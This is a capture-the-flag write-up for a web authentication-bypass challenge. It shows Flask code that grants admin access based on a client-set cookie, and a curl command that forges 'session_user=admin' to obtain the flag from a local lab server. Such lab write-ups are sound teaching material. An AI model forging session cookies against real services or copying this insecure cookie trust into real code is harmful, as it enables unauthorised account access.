# Authentication Bypass 2

In this challenge, we are given a login service. Last time, the `session_user` was determined by the url argument.
Now, the server uses cookies to transfer the `session_user` information.

```python
@app.route("/", methods=["POST"])
def challenge_post():
    ...
    response = flask.redirect(flask.request.path)
    response.set_cookie('session_user', username)
    return response
```

Luckily for us, this doesn't change the fact that we still control requests, including all information in the HTTP header.

Let's take a look at the `GET` endpoint that the `POST` redirects to:

```python
@app.route("/", methods=["GET"])
def challenge_get():
    if not (username := flask.request.cookies.get("session_user", None)):
        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
    else:
        page = f"<html><body>Hello, {username}!"
        if username == "admin":
            page += "<br>Here is your flag: " + open("/flag").read()

    return page + """
        <hr>
        <form method=post>
        User:<input type=text name=username>Pass:<input type=text name=password><input type=submit value=Submit>
        </form>
        </body></html>
    """
```

So the question now is, how do we craft our own cookie?

Reading the curl man page, we can see that using the `-b` flag will allow us to send our own cookies like so:

```bash
curl -b "session_user=admin" 'challenge.localhost:80/'
```

As a side, `-b` also can read from text files. This is useful when you want to save and automate cookie sessions.
You can use `-c` or `--cookie-jar` to to capture cookies set by the website and then subsequent message can use those
cookies with `-b` followed by the text file.

I'm sure this will come in handy in the next few challenges...
Of course, this and all our other challenges can be done with python's `requests` library too.

Anyways, this gives us the flag in the html response!